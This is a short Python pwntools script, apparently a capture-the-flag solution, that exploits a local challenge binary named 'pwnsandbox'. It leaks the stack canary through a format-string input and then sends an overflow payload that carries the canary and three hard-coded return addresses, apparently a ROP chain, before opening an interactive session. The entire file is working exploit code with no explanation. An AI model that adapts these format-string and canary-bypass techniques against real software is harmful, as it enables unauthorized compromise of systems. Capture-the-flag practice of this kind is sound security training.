#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./pwnsandbox")
p = remote("localhost", 9028)

p.recvuntil("program?:")

p.sendline("2")

p.recvuntil("program:")


p.send("\xd2\x77")

p.recvuntil("argument:")

p.sendline("123")

p.sendline("%9$p")
p.recvuntil("0x")


data = p.recvuntil("!")

canary =int(data.split("!")[0],16)
print hex(canary)
wait("me")

payload = "a" * 0x18 + p64(canary) + "a" * 8 + p64(0x402653) + p64(0x4026fb) + p64(0x4017bf)

p.sendline(payload)

p.interactive()
